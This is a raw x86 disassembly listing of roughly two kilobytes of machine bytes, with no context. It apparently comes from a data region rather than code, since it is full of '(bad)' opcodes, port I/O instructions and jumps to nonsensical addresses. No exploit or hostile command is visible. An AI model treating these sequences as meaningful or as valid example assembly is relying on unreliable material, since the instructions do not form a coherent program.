  422fcb:	into   
  422fcc:	add    bl,dh
  422fce:	sti    
  422fcf:	std    
  422fd0:	lock ret 
  422fd2:	(bad)  
  422fd5:	fyl2xp1 
  422fd7:	iret   
  422fd8:	out    dx,eax
  422fd9:	leave  
  422fda:	fmul   st(7),st
  422fdc:	mov    bl,0xb0
  422fde:	cmc    
  422fdf:	retf   0xe6eb
  422fe2:	cli    
  422fe3:	enter  0xf7db,0xf9
  422fe7:	jmp    0x422fdf
  422fe9:	mov    edx,0xc2bdd5b0
  422fee:	fcom   st(5)
  422ff0:	ffreep st(5)
  422ff2:	jmp    0x422fd8
  422ff4:	out    0xfa,al
  422ff6:	mov    esp,0xfcf20105
  422ffb:	jmp    0xb20dfeb2
  423000:	jecxz  0x422ff9
  423002:	loope  0x422fff
  423004:	fucomi st,st(3)
  423006:	mov    esi,0xd2e9dbb6
  42300b:	leave  
  42300c:	loop   0x422fef
  42300e:	rol    BYTE PTR [eax],1
  423010:	fadd   QWORD PTR ds:0x3ebc1e9
  423016:	(bad)  
  423017:	iret   
  423018:	in     eax,dx
  423019:	out    dx,al
  42301a:	retf   0xd0ad
  42301d:	jmp    0x423000
  42301f:	shl    ecx,1
  423021:	mov    dl,0xb0
  423023:	lock mov bh,0xd6
  423026:	fsubr  st,st(7)
  423028:	(bad)  
  423029:	cld    
  42302a:	stc    
  42302b:	jecxz  0x42301c
  42302d:	rcr    ecx,1
  42302f:	fcom   st(4)
  423031:	sti    
  423032:	retf   0xef0a
  423035:	pop    es
  423036:	out    0xe3,eax
  423038:	aam    0xf3
  42303a:	icebp  
  42303b:	stos   DWORD PTR es:[edi],eax
  42303c:	icebp  
  42303d:	loope  0x422ff0
  42303f:	iret   
  423040:	leave  
  423041:	imul   esp
  423043:	out    dx,al
  423044:	stc    
  423045:	xlat   BYTE PTR ds:[ebx]
  423046:	idiv   edx
  423048:	jmp    0x423025
  42304a:	iret   
  42304b:	aam    0xee
  42304d:	fpatan 
  42304f:	in     eax,dx
  423050:	or     esp,ebx
  423052:	fcmovu st,st(4)
  423054:	ret    0xf901
  423057:	push   es
  423058:	(bad)  
  423059:	fcomip st,st(3)
  42305b:	repnz xlat BYTE PTR ds:[ebx]
  42305d:	shl    bh,0xd5
  423060:	ret    
  423061:	shr    edx,1
  423063:	ror    edi,cl
  423065:	mov    cl,0xbb
  423067:	sti    
  423068:	iret   
  423069:	aam    0xc8
  42306b:	loope  0x423045
  42306d:	rcl    dh,0xd6
  423070:	(bad)  
  423071:	idiv   BYTE PTR [ebx+ebp*8-0x15040621]
  423078:	stc    
  423079:	add    eax,0xbde2ddf1
  42307e:	out    0xcc,eax
  423080:	rol    ah,0xc6
  423083:	retf   0xdef1
  423086:	out    dx,eax
  423087:	(bad)  
  423088:	fcmove st,st(0)
  42308a:	mov    ebx,0xc2e7d5b7
  42308f:	(bad)  
  423090:	in     al,dx
  423091:	(bad)  
  423093:	sti    
  423094:	(bad)  
  423095:	(bad)  
  423097:	out    0xe6,eax
  423099:	in     eax,0xdc
  42309b:	shl    dl,0xa5
  42309e:	out    0xc2,eax
  4230a0:	in     al,dx
  4230a1:	cli    
  4230a2:	into   
  4230a3:	iret   
  4230a4:	repz (bad) 
  4230a7:	rcr    esp,1
  4230a9:	ret    
  4230aa:	int3   
  4230ab:	mov    edi,0xc1cd03f8
  4230b0:	neg    bl
  4230b2:	add    ah,cl
  4230b4:	retf   0xae4
  4230b7:	retf   0xede3
  4230ba:	add    ecx,ebp
  4230bc:	lods   al,BYTE PTR ds:[esi]
  4230bd:	mov    bl,0xec
  4230bf:	out    0xbc,eax
  4230c1:	ret    0xebb5
  4230c4:	out    0xc9,al
  4230c6:	(bad)  
  4230c7:	xlat   BYTE PTR ds:[ebx]
  4230c8:	fcomp  st(4)
  4230ca:	enter  0xd7d2,0xf9
  4230ce:	mov    ah,0xc0
  4230d0:	cmc    
  4230d1:	clc    
  4230d2:	out    0xe7,al
  4230d4:	aad    0xcf
  4230d6:	cli    
  4230d7:	add    ch,cl
  4230d9:	push   es
  4230da:	in     eax,0xd1
  4230dc:	leave  
  4230dd:	repnz test al,0xeb
  4230e0:	loope  0x4230d3
  4230e2:	mov    ecx,0xfeacd8cf
  4230e8:	jmp    0x4230e3
  4230ea:	fidivr DWORD PTR [eax-0xa2c18ff]
  4230f0:	mov    DWORD PTR [edx+ebx*8],0xe5dae102
  4230f7:	or     BYTE PTR [edx],al
  4230f9:	in     al,dx
  4230fa:	out    0xd9,al
  4230fc:	lods   al,BYTE PTR ds:[esi]
  4230fd:	in     al,dx
  4230fe:	(bad)  
  4230ff:	mov    bh,0xe0
  423101:	cli    
  423102:	mul    edi
  423104:	aad    0xd7
  423106:	hlt    
  423107:	in     eax,dx
  423108:	add    esp,ebx
  42310a:	sar    bl,1
  42310c:	mov    dh,0x1
  42310e:	int3   
  42310f:	rcr    al,cl
  423111:	aad    0xf8
  423113:	jmp    0x4230e5
  423115:	(bad)  
  423117:	in     al,dx
  423118:	into   
  423119:	enter  0xedcf,0xc9
  42311d:	mov    ebp,0xc4aec2c0
  423122:	in     al,dx
  423123:	out    0xb9,al
  423125:	(bad)  
  423126:	lods   al,BYTE PTR ds:[esi]
  423127:	mov    edx,0xf3ddd6c9
  42312c:	ret    
  42312d:	bnd ret 0xc0f9
  423131:	test   bh,0xf0
  423134:	(bad)  
  423136:	out    dx,eax
  423137:	(bad)  
  423138:	in     eax,dx
  423139:	dec    edx
  42313b:	ret    
  42313c:	les    ebp,FWORD PTR [ecx-0xc151e16]
  423142:	aad    0xd5
  423144:	(bad)  
  423145:	mul    ah
  423147:	mov    bl,0xed
  423149:	neg    esp
  42314b:	mov    esp,0xcdf102fb
  423150:	add    DWORD PTR [ebp+0x3cbe1f6],edi
  423156:	paddd  mm3,mm1
  423159:	sti    
  42315a:	in     al,0xdc
  42315c:	test   eax,0xc8ecc2ac
  423161:	(bad)  
  423162:	rcl    ebx,1
  423164:	stc    
  423165:	retf   
  423166:	(bad)  
  423168:	fidiv  WORD PTR [ebp-0x1f0a1e0f]
  42316e:	fistp  QWORD PTR [ebp+0x5f4f7fb]
  423174:	fucomip st,st(6)
  423176:	hlt    
  423177:	pop    es
  423178:	les    eax,FWORD PTR [edx+ebp*8]
  42317b:	retf   
  42317c:	test   eax,0xd7e6ecf1
  423181:	iret   
  423182:	lods   al,BYTE PTR ds:[esi]
  423183:	mov    ah,0xce
  423185:	iret   
  423186:	(bad)
  423189:	int3   
  42318a:	(bad)  
  42318c:	fldln2 
  42318e:	shl    al,cl
  423190:	(bad)  
  423192:	rol    ah,0xe9
  423195:	add    ecx,esp
  423197:	out    0xef,al
  423199:	in     eax,0xc4
  42319b:	shl    dl,0xdd
  42319e:	scas   eax,DWORD PTR es:[edi]
  42319f:	mov    ch,0xb4
  4231a1:	icebp  
  4231a2:	out    0xf9,al
  4231a4:	mov    ah,0xf1
  4231a6:	in     eax,0xcb
  4231a8:	clc    
  4231a9:	in     al,dx
  4231aa:	int    0xf3
  4231ac:	neg    esi
  4231ae:	inc    DWORD PTR [ebx]
  4231b0:	cmc    
  4231b1:	aam    0xfe
  4231b3:	rcl    dh,1
  4231b5:	out    dx,eax
  4231b6:	jmp    0x4231c6
  4231b8:	jmp    0x42317e
  4231ba:	jmp    0x4231ad
  4231bc:	mov    esi,0xe0b0adde
  4231c1:	icebp  
  4231c2:	shl    edi,0xeb
  4231c5:	(bad)
  4231c8:	call   0xdd101c87
  4231cd:	fbstp  TBYTE PTR [esp+ebx*8+0x9cad1c2]
  4231d4:	shufps xmm1,xmm2,0xd4
  4231d8:	(bad)  
  4231da:	into   
  4231db:	lock enter 0xadb7,0xb3
  4231e0:	enter  0xe6ee,0xc1
  4231e4:	int    0xcb
  4231e6:	rcl    eax,cl
  4231e8:	repnz icebp 
  4231ea:	iret   
  4231eb:	fdivrp st(0),st
  4231ed:	aad    0xcd
  4231ef:	lock out 0xc7,al
  4231f2:	rcr    ecx,1
  4231f4:	or     al,BYTE PTR ds:0xd13eedb
  4231fa:	int    0xe5
  4231fc:	lock int3 
  4231fe:	out    0xd3,al
  423200:	not    dh
  423202:	call   0xec2bebcb
  423207:	fucomip st,st(2)
  423209:	jmp    0x4231db
  42320b:	mov    ecx,0xd3b4d3f0
  423210:	aad    0xc4
  423212:	add    eax,esi
  423214:	shl    ah,1
  423216:	dec    BYTE PTR ds:0xc6ce0cff
  42321c:	test   al,0xc6
  42321e:	repnz test ch,0xb1
  423222:	iret   
  423223:	repz into 
  423225:	shr    ah,1
  423227:	mov    ebx,0xb7c9bef4
  42322c:	int3   
  42322d:	add    esp,edi
  42322f:	mov    esp,0x8d2e5e2
  423234:	lock or edx,edi
  423237:	iret   
  423238:	push   cs
  423239:	adc    dl,dl
  42323b:	(bad)  
  42323d:	fsubr  QWORD PTR [edi-0x163c1811]
  423243:	enter  0xd3bb,0xcc
  423247:	(bad)  
  423248:	std    
  423249:	mov    ebp,0xfecdd7ff
  42324e:	cli    
  42324f:	add    ebp,ebx
  423251:	inc    BYTE PTR [eax]
  423253:	add    BYTE PTR [esi+0xe0ccbbd],bh
  423259:	add    edx,DWORD PTR [edx]
  42325b:	repz int3 
  42325d:	out    dx,eax
  42325e:	lds    ebp,FWORD PTR [edi-0x3a180e2b]
  423264:	(bad)  
  423266:	xlat   BYTE PTR ds:[ebx]
  423267:	repnz mov dl,0xc8
  42326a:	faddp  st(2),st
  42326c:	xlat   BYTE PTR ds:[ebx]
  42326d:	(bad)  
  42326e:	fpatan 
  423270:	cli    
  423271:	fsub   st,st(5)
  423273:	fstp   st(2)
  423275:	add    al,0xcf
  423277:	push   cs
  423278:	hlt    
  423279:	out    dx,eax
  42327a:	add    al,0xd0
  42327c:	icebp  
  42327d:	shl    al,1
  42327f:	loop   0x423242
  423281:	test   eax,0xf1e9faea
  423286:	mov    ebx,0xe2bcf3be
  42328b:	call   0xf725007c
  423290:	cli    
  423291:	clc    
  423292:	out    0xfc,eax
  423294:	sar    edx,0x8
  423297:	fld    QWORD PTR [eax+ebp*8]
  42329a:	movsx  esi,BYTE PTR [edx-0x432a2c10]
  4232a1:	icebp  
  4232a2:	shl    ch,1
  4232a4:	mov    eax,0x3f0d3d8
  4232a9:	iret   
  4232aa:	jmp    0xcd43349f
  4232af:	mov    esp,0x907c2bd
  4232b4:	(bad)  
  4232b5:	out    0xcf,eax
  4232b7:	stc    
  4232b8:	into   
  4232b9:	jmp    0xd1ec189d
  4232be:	fstp   st(5)
  4232c0:	repnz hlt 
  4232c2:	out    0xce,eax
  4232c4:	out    0xc9,al
  4232c6:	clc    
  4232c7:	aam    0xcd
  4232c9:	iret   
  4232ca:	sti    
  4232cb:	loopne 0x4232cd
  4232cd:	int    0xfb
  4232cf:	rcl    ebp,1
  4232d1:	(bad)  
  4232d2:	retf   
  4232d3:	or     dh,ah
  4232d5:	pop    es
  4232d6:	add    al,0xe3
  4232d8:	out    0xea,al
  4232da:	into   
  4232db:	(bad)  
  4232dc:	enter  0xccb7,0xce
  4232e0:	into   
  4232e1:	shl    ebp,0xf7
  4232e4:	retf   0xd6d8
  4232e7:	mov    ah,0xee
  4232e9:	jmp    0xdf0111db
  4232ee:	loopne 0x4232dc
  4232f0:	loop   0x4232d0
  4232f2:	hlt    
  4232f3:	cld    
  4232f4:	or     ch,bh
  4232f6:	std    
  4232f7:	or     al,0x0
  4232f9:	or     eax,0xadeda70f
  4232fe:	(bad)
  423301:	mov    dl,0xed
  423303:	(bad)  
  423304:	(bad)  
  423305:	repnz mov ecx,0xd0cacdf9
  42330b:	in     eax,dx
  42330c:	fcomip st,st(6)
  42330e:	push   es
  42330f:	aad    0xc6
  423311:	jmp    0x4232e3
  423313:	loope  0x4232db
  423315:	in     al,0x3
  423317:	add    ecx,ebx
  423319:	retf   0xe20c
  42331c:	rol    dh,1
  42331e:	loopne 0x4232d5
  423320:	jecxz  0x4232f1
  423322:	retf   0xb5db
  423325:	enter  0xc8f9,0xd0
  423329:	(bad)  
  42332a:	mov    edx,0x3d7e8d0
  42332f:	repnz sti 
  423331:	(bad)  
  423332:	cli    
  423333:	or     bh,al
  423335:	jmp    0xd8dd:0x9f3feea
  42333c:	lods   eax,DWORD PTR ds:[esi]
  42333d:	(bad)  
  42333f:	xlat   BYTE PTR ds:[ebx]
  423340:	retf   0xe5b5
  423343:	call   0xe03a090c
  423348:	lock mov ecx,0xfbf4bff6
  42334e:	in     eax,dx
  42334f:	idiv   cl
  423351:	fptan  
  423353:	icebp  
  423354:	out    0xff,eax
  423356:	or     eax,0xe60dee0f
  42335b:	lock mov eax,0xd4d4dcbc
  423361:	sar    DWORD PTR [ebx-0x42f1209],cl
  423367:	mov    ch,0xe8
  423369:	rcr    dl,1
  42336b:	iret   
  42336c:	pop    es
  42336d:	aam    0x6
  42336f:	hlt    
  423370:	shl    ebp,cl
  423372:	std    
  423373:	loop   0x423378
  423375:	mov    ebp,0xcdcfac0
  42337a:	or     cl,ch
  42337c:	jmp    0x42336d
  42337e:	jmp    0xc9150f2f
  423383:	shl    esp,0xcb
  423386:	test   eax,0xbfcff9b9
  42338c:	xlat   BYTE PTR ds:[ebx]
  42338d:	(bad)  
  42338f:	fcmovu st,st(1)
  423391:	rol    BYTE PTR ds:0xf809f709,1
  423397:	or     BYTE PTR [ebx],dl
  423399:	or     eax,0xc8f2abee
  42339e:	call   0xd125f767
  4233a3:	aad    0xd1
  4233a5:	call   0xef212a63
  4233aa:	mov    esi,0xdfceb8bc
  4233af:	add    edi,DWORD PTR [ebx+ecx*8-0x3e3f0127]
  4233b6:	leave  
  4233b7:	or     edx,esp
  4233b9:	out    0xda,eax
  4233bb:	jmp    0xd1dc:0xefccc8ac
  4233c2:	test   al,0xc6
  4233c4:	in     eax,0xf6
  4233c6:	f2xm1  
  4233c8:	test   cl,0xdb
  4233cb:	test   eax,0xf5d9bebe
  4233d1:	out    0xdc,al
  4233d3:	fucomi st,st(0)
  4233d5:	hlt    
  4233d6:	retf   
  4233d7:	call   0xf21c36dd
  4233dc:	mov    eax,0xaeedeed7
  4233e1:	ret    
  4233e2:	cli    
  4233e3:	out    0xf5,al
  4233e5:	repz (bad) 
  4233e7:	iret   
  4233e8:	cli    
  4233e9:	mov    esp,0xdbb9cff5
  4233ee:	std    
  4233ef:	lock stc 
  4233f1:	mov    ebp,0xc0fdc3d9
  4233f6:	enter  0xeeb,0xf2
  4233fa:	fisubr DWORD PTR [ecx-0x180d1829]
  423400:	(bad)  
  423402:	(bad)  
  423403:	retf   0xd6f0
  423406:	out    dx,eax
  423407:	cli    
  423408:	jecxz  0x4233c7
  42340a:	idiv   dh
  42340c:	cli    
  42340d:	into   
  42340e:	add    eax,0xeaebc5d2
  423413:	pop    es
  423414:	lock loope 0x4233df
  423417:	psubsw mm1,QWORD PTR [edi]
  42341a:	adc    edx,ebp
  42341c:	test   eax,0xdce2c4b7
  423421:	cli    
  423422:	rcl    edi,cl
  423424:	cli    
  423425:	(bad)  
  423426:	mov    ch,0xc5
  423428:	rcl    bh,cl
  42342a:	int    0xdb
  42342c:	xlat   BYTE PTR ds:[ebx]
  42342d:	cld    
  42342e:	ret    
  42342f:	(bad)  
  423430:	mov    esi,0xe0cbe7f7
  423435:	std    
  423436:	std    
  423437:	retf   0x3ec
  42343a:	int3   
  42343b:	sar    DWORD PTR [edx+eiz*8-0x283f4e3f],cl
  423442:	loopne 0x423437
  423444:	int3   
  423445:	mov    edi,0xccd9edcd
  42344a:	loope  0x423443
  42344c:	out    0xc1,eax
  42344e:	loop   0x42340e
  423450:	ffreep st(3)
  423452:	fimul  DWORD PTR [ebx]
  423454:	jmp    0x42344e
  423456:	(bad)  
  423457:	jmp    0x423423
  423459:	out    dx,al
  42345a:	loope  0x423414
  42345c:	mov    al,0xf2
  42345e:	shr    edx,1
  423460:	(bad)  
  423461:	mov    ah,0xc6
  423463:	aad    0xf0
  423465:	in     al,0xe8
  423467:	call   0xc3151168
  42346c:	mov    dh,0xd5
  42346e:	loopne 0x42344e
  423470:	add    al,0xd7
  423472:	or     DWORD PTR [edi],eax
  423474:	lock shl ecx,0xd8
  423478:	or     cl,BYTE PTR [edx]
  42347a:	in     eax,0xc1
  42347c:	rcl    ecx,cl
  42347e:	ror    dh,1
  423480:	imul   DWORD PTR [edi+edx*8-0x45204728]
  423487:	mov    ebx,0xc8f1fbbe
  42348c:	call   0xf125f869
  423491:	cli    
  423492:	cli    
  423493:	push   es
  423494:	(bad)  
  423495:	call   0xfc0d31a1
  42349a:	icebp  
  42349b:	test   eax,0xbdcff1ee
  4234a0:	mov    dh,0xc1
  4234a2:	jmp    0xcada:0xf4eff1ea
  4234a9:	aad    0xd2
  4234ab:	cli    
  4234ac:	fsubr  st,st(4)
  4234ae:	faddp  st(5),st
  4234b0:	add    al,0xd8
  4234b2:	loopne 0x4234ac
  4234b4:	cmc    
  4234b5:	loop   0x423490
  4234b7:	leave  
  4234b8:	in     eax,dx
  4234b9:	jmp    0xb0e8:0xb1c4e5cd
  4234c0:	jmp    0x4234af
  4234c2:	sti    
  4234c3:	(bad)  
  4234c5:	fcmove st,st(5)
  4234c7:	aam    0xfb
  4234c9:	fnstcw WORD PTR [ebp-0x5292413]
  4234cf:	mov    ebp,0xca00d6e7
  4234d4:	add    eax,0xecc6eadf
  4234d9:	stc    
  4234da:	adc    eax,ecx
  4234dc:	icebp  
  4234dd:	scas   al,BYTE PTR es:[edi]
  4234de:	shl    ebp,1
  4234e0:	mov    ch,0xdb
  4234e2:	not    dl
  4234e4:	call   0xcf1afb9e
  4234e9:	not    dl
  4234eb:	mov    eax,0xbc00e3e1
  4234f0:	clc    
  4234f1:	lock fisttp DWORD PTR [eax]
  4234f4:	fsubr  st,st(3)
  4234f6:	add    al,0xd
  4234f8:	jecxz  0x4234c4
  4234fa:	add    ebp,eax
  4234fc:	mov    al,0xef
  4234fe:	jmp    0xe12dffd3
  423503:	mov    edx,0xd9f5bfb5
  423508:	sti    
  423509:	loop   0x4234da
  42350b:	mov    ecx,0x3bff4f6
  423510:	xlat   BYTE PTR ds:[ebx]
  423511:	fild   DWORD PTR [edx]
  423513:	call   0xf90e2114
  423518:	retf   0x2fe
  42351b:	repz jecxz 0x42350e
  42351e:	retf   0xd2c8
  423521:	xlat   BYTE PTR ds:[ebx]
  423522:	cli    
  423523:	repnz mov bh,0xc7
  423526:	push   DWORD PTR [edi-0xc1c402f]
  42352c:	enter  0x6f5,0xda
  423530:	int3   
  423531:	cld    
  423532:	rcr    ebx,0xc9
  423535:	or     bl,al
  423537:	loop   0x423512
  423539:	jecxz  0x42350d
  42353b:	test   eax,0xd0e6ddcc
  423540:	aam    0xc8
  423542:	hlt    
  423543:	repz (bad) 
  423545:	sar    BYTE PTR [ecx-0x10123633],1
  42354b:	aam    0x0
  42354d:	aad    0xc0
  42354f:	add    esi,esp
  423551:	or     esi,eax
  423553:	loope  0x423560
  423555:	in     al,0x5
  423557:	out    dx,al
  423558:	lds    eax,FWORD PTR [edx]
  42355a:	icebp  
  42355b:	stos   DWORD PTR es:[edi],eax
  42355c:	mov    bl,0xbd
  42355e:	test   ch,0xb1
  423561:	mov    ah,0xef
  423563:	in     al,0xf3
  423565:	in     al,0xbb
  423567:	stc    
  423568:	leave  
  423569:	add    bl,ah
  42356b:	sti    
  42356c:	xlat   BYTE PTR ds:[ebx]
  42356d:	fld    QWORD PTR [esi]
  42356f:	add    esi,edi
  423571:	hlt    
  423572:	jmp    0x42354e
  423574:	add    BYTE PTR [edi],cl
  423576:	jmp    0xcc2c1280
  42357b:	stos   BYTE PTR es:[edi],al
  42357c:	xlat   BYTE PTR ds:[ebx]
  42357d:	fucomp st(2)
  42357f:	into   
  423580:	loope  0x42356c
  423582:	out    dx,eax
  423583:	rol    dh,0xc6
  423586:	mov    dh,0xb5
  423588:	mov    esp,0xbebab0d3
  42358d:	(bad)  
  42358f:	std    
  423590:	rol    edi,cl
  423592:	(bad)  
  423594:	(bad)  
  423595:	out    dx,eax
  423596:	fadd   QWORD PTR ds:0xc5fe0a07
  42359c:	scas   al,BYTE PTR es:[edi]
  42359d:	into   
  42359e:	in     al,dx
  42359f:	icebp  
  4235a0:	ror    dl,1
  4235a2:	repnz jmp 0xb9b8:0xf9f7e9db
  4235aa:	lock out dx,eax
  4235ac:	mov    esi,0xfcffe1f0
  4235b1:	fld    QWORD PTR [edx]
  4235b3:	add    eax,eax
  4235b5:	(bad)  
  4235b6:	jmp    0xe31d2f9c
  4235bb:	test   al,0xe6
  4235bd:	(bad)  
  4235be:	mov    bl,0xb1
  4235c0:	mov    bl,0xed
  4235c2:	test   al,0xc4
  4235c4:	call   esp
  4235c6:	mov    edx,0xd3f1e4c5
  4235cb:	fstp   st(4)
  4235cd:	out    dx,eax
  4235ce:	aad    0xec
  4235d0:	mov    ebp,0x2cbc2d0
  4235d5:	std    
  4235d6:	add    ah,dh
  4235d8:	out    dx,eax
  4235d9:	or     ecx,DWORD PTR [ebx]
  4235db:	mov    edi,0xe1b7aee7
  4235e0:	int    0xf2
  4235e2:	hlt    
  4235e3:	fadd   st,st(0)
  4235e5:	cmc    
  4235e6:	stc    
  4235e7:	(bad)  
  4235e8:	repz in al,dx
  4235ea:	out    dx,eax
  4235eb:	add    DWORD PTR [ecx],eax
  4235ed:	loopne 0x4235e3
  4235ef:	std    
  4235f0:	push   es
  4235f1:	vpmulhuw ymm3,ymm1,ymm5
  4235f5:	iret   
  4235f6:	(bad)  
  4235f7:	jmp    0xe7d3:0xae0ce50c
  4235fe:	shl    DWORD PTR [ebx-0x2a0c4b40],cl
  423604:	into   
  423605:	mov    edi,0xfeb9bde9
  42360a:	loop   0x4235c6
  42360c:	clc    
  42360d:	add    eax,ebx
  42360f:	ret    
  423610:	fisttp QWORD PTR [ebx]
  423612:	std    
  423613:	pop    es
  423614:	cli    
  423615:	leave  
  423616:	aad    0xde
  423618:	in     eax,dx
  423619:	les    edx,FWORD PTR [edx]
  42361b:	enter  0xb2cf,0xb2
  42361f:	ret    0xb1c0
  423622:	ret    0xdbf3
  423625:	out    dx,eax
  423626:	aad    0xfe
  423628:	lock jecxz 0x423626
  42362b:	fld    st(3)
  42362d:	pop    es
  42362e:	(bad)  
  423630:	fimul  DWORD PTR [ebx]
  423632:	add    ebx,edi
  423634:	(bad)  
  423635:	clc    
  423636:	in     eax,dx
  423637:	ret    
  423638:	push   es
  423639:	or     edi,eax
  42363b:	rol    ah,1
  42363d:	icebp  
  42363e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42363f:	in     eax,dx
  423640:	retf   0xfafb
  423643:	sti    
  423644:	in     al,0xb9
  423646:	stc    
  423647:	in     eax,0xcd
  423649:	repz shr eax,cl
  42364c:	add    dh,dl
  42364e:	pop    es
  42364f:	xlat   BYTE PTR ds:[ebx]
  423650:	or     esi,edx
  423652:	ret    0xc1df
  423655:	cmc    
  423656:	fmul   DWORD PTR [ebx]
  423658:	fmul   st,st(2)
  42365a:	or     edi,DWORD PTR [ecx-0x2c1b2931]
  423660:	aam    0xc6
  423662:	icebp  
  423663:	mov    dl,0xea
  423665:	repz out 0xe8,al
  423668:	cmc    
  423669:	xlat   BYTE PTR ds:[ebx]
  42366a:	clc    
  42366b:	fincstp 
  42366d:	ret    
  42366e:	mov    ebp,0xe405d6c0
  423674:	jmp    0x34b1b54
  423679:	cld    
  42367a:	add    DWORD PTR [esi-0x391b573e],ebp
  423680:	ror    ah,0xb6
  423683:	xlat   BYTE PTR ds:[ebx]
  423684:	repz repnz sar BYTE PTR [eax-0x12404605],cl
  42368c:	jecxz  0x42366e
  42368e:	int3   
  42368f:	shl    ah,1
  423691:	lock add DWORD PTR [edx],eax
  423694:	add    eax,0x9de00e0
  423699:	or     bh,ah
  42369b:	enter  0xf1b3,0xc4
  42369f:	sar    ebx,0xcd
  4236a2:	bnd jmp 0xf411fb7d
  4236a8:	clc    
  4236a9:	shr    ebp,cl
  4236ab:	(bad)  
  4236ac:	out    dx,al
  4236ad:	rcl    eax,0x5
  4236b0:	ror    ebx,0xdc
  4236b3:	rcl    ch,1
  4236b5:	xlat   BYTE PTR ds:[ebx]
  4236b6:	fmulp  st(7),st
  4236b8:	out    0xfb,eax
  4236ba:	retf   0xc3e5
  4236bd:	ret    
  4236be:	out    0xc1,al
  4236c0:	icebp  
  4236c1:	into   
  4236c2:	rol    ah,cl
  4236c4:	leave  
  4236c5:	in     al,0xdd
  4236c7:	(bad)  
  4236c8:	stc    
  4236c9:	leave  
  4236ca:	add    al,BYTE PTR [ebx]
  4236cc:	aam    0xdb
  4236ce:	mov    ebp,0xd7f8bae6
  4236d3:	fucomip st,st(1)
  4236d5:	call   0xca3b1d9f
  4236da:	out    dx,eax
  4236db:	(bad)  
  4236dc:	(bad)  
  4236de:	mov    esi,0xe4b7eab3
  4236e3:	leave  
  4236e4:	(bad)  
  4236e5:	sar    edx,1
  4236e7:	stc    
  4236e8:	into   
  4236e9:	jmp    0x4236da
  4236eb:	(bad)  
  4236ec:	out    dx,al
  4236ed:	rcl    dh,cl
  4236ef:	loopne 0x4236b2
  4236f1:	(bad)
  4236f4:	pop    es
  4236f5:	(bad)  
  4236f6:	aam    0xfb
  4236f8:	enter  0xc00,0xb9
  4236fc:	into   
  4236fd:	rol    ebx,0xc2
  423700:	jmp    0x342deb
  423705:	hlt    
  423706:	int3   
  423707:	jmp    0x4236e6
  423709:	mov    edx,0xdef9c9d1
  42370e:	(bad)  
  42370f:	mov    ebx,0xf0e0d3fc
  423714:	cld    
  423715:	in     al,0x9
  423717:	fadd   QWORD PTR [eax]
  423719:	jecxz  0x423715
  42371b:	shr    DWORD PTR [ebp-0x361f3d38],cl
  423721:	shr    DWORD PTR [eax-0x442b2c49],1
  423727:	(bad)  
  423728:	cld    
  423729:	fild   WORD PTR [ecx]
  42372b:	fcomi  st,st(4)
  42372d:	push   eax
  42372f:	ret    
  423730:	hlt    
  423731:	std    
  423732:	icebp  
  423733:	loope  0x423740
  423735:	loopne 0x42370c
  423737:	add    esp,esi
  423739:	fdiv   st(7),st
  42373b:	(bad)  
  42373c:	into   
  42373d:	(bad)  
  42373f:	jmp    0xbbeafe16
  423744:	mov    ebx,0xf0f8e8cc
  423749:	fmulp  st(5),st
  42374b:	sti    
  42374c:	ret    0xd4d8
  42374f:	mov    esp,0xe904e7f6
  423754:	out    0xe8,al
  423756:	mov    BYTE PTR ds:0xf3e9e4f3,0xb0
  42375d:	jmp    0x423747
  42375f:	leave  
  423760:	lods   eax,DWORD PTR ds:[esi]
  423761:	out    dx,al
  423762:	ror    ch,1
  423764:	out    dx,eax
  423765:	leave  
  423766:	icebp  
  423767:	cli    
  423768:	fnstcw WORD PTR [eax-0x28174818]
  42376e:	fld    st(6)
  423770:	fiadd  WORD PTR [ecx]
  423772:	jecxz  0x423757
  423774:	or     esp,esi
  423776:	loope  0x423747
  423778:	add    eax,0xd1c304d9
  42377d:	div    DWORD PTR [edi-0x4f362955]
  423783:	clc    
  423784:	hlt    
  423785:	out    dx,al
  423786:	fnstenv [ebp+ecx*8-0x12290d13]
  42378d:	mov    ch,0xf6
  42378f:	sar    cl,cl
  423791:	fld    DWORD PTR [ecx]
  423793:	call   0xe9491298
  423798:	jmp    0xa9221786
  42379d:	into   
  42379e:	jmp    0xbc27288e
  4237a3:	cli    
  4237a4:	hlt    
  4237a5:	mov    ch,0xea
  4237a7:	cld    
  4237a8:	cld    
  4237a9:	in     al,dx
  4237aa:	(bad)  
  4237ab:	(bad)  
  4237ad:	out    dx,eax
  4237ae:	jecxz  0x4237b6
  4237b0:	cli    
  4237b1:	add    eax,esp
  4237b3:	cli    
  4237b4:	in     eax,0x0
  4237b6:	aam    0xc4
  4237b8:	out    0xe1,eax
  4237ba:	into   
  4237bb:	mov    bl,0xee
  4237bd:	shl    cl,1
  4237bf:	in     eax,0xeb
  4237c1:	lock rcr edx,cl
  4237c4:	shl    dl,cl
  4237c6:	repz sar BYTE PTR [eax-0xd2c3541],1
  4237cd:	repz fcmovbe st,st(1)
  4237d0:	add    bl,ch
  4237d2:	hlt    
  4237d3:	shl    cl,0xc9
  4237d6:	cli    
  4237d7:	lds    ecx,FWORD PTR [eax+ecx*8]
  4237da:	add    al,0xb8
  4237dc:	lock fsubrp st(4),st
  4237df:	lods   al,BYTE PTR ds:[esi]
  4237e0:	div    BYTE PTR [ebx+edi*4-0x3b35194b]
  4237e7:	int    0xbd
  4237e9:	int3   
  4237ea:	call   0xc721f3f1
  4237ef:	shl    ch,cl
  4237f1:	mov    esp,0xe7d4e2e2
  4237f6:	in     eax,0x7
  4237f8:	add    ecx,DWORD PTR [ecx]
  4237fa:	add    dh,al
  4237fc:	mov    ebp,0xb2b2d3ee
  423801:	int    0xf6
  423803:	mov    bl,0xe7
  423805:	fcom   st(6)
  423807:	into   
  423808:	fstp   TBYTE PTR [edx-0x3f18302a]
  42380e:	not    ebx
  423810:	rcr    dl,cl
  423812:	cld    
  423813:	(bad)  
  423814:	fstp   st(5)
  423816:	(bad)  
  423818:	call   0xdcf14c0f
  42381d:	fcomip st,st(3)
  42381f:	aam    0xef
  423821:	in     al,0xb7
  423823:	mov    bh,0xd5
  423825:	hlt    
  423826:	mov    al,0xba
  423828:	(bad)  
  42382a:	mov    edi,0xf6efc2cf
  42382f:	mov    ch,0xd7
  423832:	loopne 0x423825
  423834:	add    eax,DWORD PTR [eax]
  423836:	in     eax,dx
  423837:	retf   
  423838:	repz in eax,0xf8
  42383b:	mov    bl,0xa6
  42383d:	iret   
  42383e:	mov    cl,0xe2
  423840:	rol    ebx,1
  423842:	stc    
  423843:	stc    
  423844:	clc    
  423845:	into   
  423846:	mov    esi,0xe9c3bbb5
  42384b:	fmul   st,st(4)
